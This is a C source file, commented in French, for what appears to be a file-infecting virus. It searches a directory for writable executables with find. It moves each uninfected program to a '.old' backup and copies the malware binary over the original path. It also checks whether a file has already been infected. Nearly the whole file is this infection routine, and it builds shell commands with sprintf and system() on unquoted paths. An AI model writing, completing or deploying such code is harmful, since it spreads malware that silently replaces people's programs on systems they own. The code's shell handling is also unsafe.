
#include "malwareUtils.h"
#include "malwareBuilder.h"
#include <unistd.h>
#include <stdbool.h>

/**
 * @return Execute la command puis renvoie un char* contenant le résultat
*/
void getAllFile_exec(char* command,MalwareBuilder *malware) {
    char buffer[1024];
    FILE* pipe = popen(command, "r");

    if (pipe == NULL) {
        printf("Failed to run command\n");
        return;
    }
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {

        // Remove trailing newline
        buffer[strcspn(buffer, "\n")] = 0;

        if (isInfected(buffer, malware) == 0){
            infect_prog(buffer, malware);
        }
    }

    pclose(pipe);
}

/*
* Infecte le fichier path avec le malware
*/
int infect_prog(char *path, MalwareBuilder *malware){
    printf("path : %s, ext : %s\n",path,malware->defaultExtensionName);

    //move le fichier sains vers une extension .old
    char cmd_move[1024];
    sprintf(cmd_move, "mv %s %s%s", path, path, malware->defaultExtensionName);
    system(cmd_move);

    // copie le malware dans le fichier sains
    char cmd_copy[1024];
    sprintf(cmd_copy, "cp %s/%s %s", malware->defaultRepository, malware->malwareName, path);
    printf("cmd_copy: %s\n",cmd_copy);
    system(cmd_copy);

    return 0;
}

/**
* Vérifie si le fichier path est infecté .old et sans extension sont présent
* @Param path : chemin du fichier à vérifier
* @Param malware : malware
*/
bool isInfected(char *path, MalwareBuilder *malware)
{
    char malware_path[1024];
    sprintf(malware_path, "%s%s", path, malware->defaultExtensionName);
    //printf("malware_path: %s\n",path);
    return (access(malware_path, F_OK) == 0 && access(path, F_OK) == 0);
}

/**
* Récupére les fichiers exécutables et modifiables par l'utilisateur avec les droits d'écriture
*/
void getUserWorldWritableFiles(MalwareBuilder *malware)
{
    char cmd[1024];
    printf("defaultRepository: %s\n",malware->defaultRepository);
    sprintf(cmd, "find '%s' -executable -not -name '*.old' -writable -type f -exec ls -l {} \\; 2>/dev/null | grep 'bin' | cut -d ' ' -f9-", malware->defaultRepository);
    //
    getAllFile_exec(cmd,malware);
}

/**
* Récupère le répertoire courant de l'utilisateur
*
*/
char *getUserCurentDir(){
    char *buf;
    buf=(char *)malloc(100*sizeof(char));
    getcwd(buf,100);
    return buf;
}





